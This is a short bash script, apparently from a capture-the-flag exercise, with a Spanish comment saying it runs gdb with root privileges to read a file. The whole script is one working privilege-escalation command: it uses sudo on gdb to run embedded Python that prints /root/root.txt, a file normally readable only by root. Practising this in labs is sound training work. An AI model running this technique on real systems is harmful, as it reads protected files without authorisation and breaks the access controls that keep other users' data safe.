#!/bin/bash

# Ejecuta gdb con privilegios de root para leer el archivo
sudo gdb -nx -ex 'python print(open("/root/root.txt").read())' -ex quit
